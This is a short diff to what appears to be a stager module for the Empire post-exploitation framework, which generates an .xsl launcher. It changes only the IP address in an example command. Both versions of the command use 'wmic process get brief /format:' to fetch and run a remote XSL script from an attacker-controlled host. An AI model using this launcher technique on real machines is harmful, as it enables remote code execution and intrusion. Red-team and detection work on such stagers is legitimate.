@@ -13,7 +13,7 @@ class Stager:
             'Description': ('Generates a .xsl launcher for Empire.'),
 
             'Comments': [
-                'wmic process get brief /format:"http://10.10.14.172/launcher.xsl"'
+                'wmic process get brief /format:"http://10.10.10.10/launcher.xsl"'
             ]
         }
 
@@ -733,7 +733,7 @@ class Stager:
                 ]]></ms:script>
                 </stylesheet>
                 """
-                command = """\n[+] wmic process get brief /format:"http://10.10.14.172/launcher.xsl" """                       
+                command = """\n[+] wmic process get brief /format:"http://10.10.10.10/launcher.xsl" """                       
                 print colored(command, 'green', attrs=['bold'])      
                 
                                 
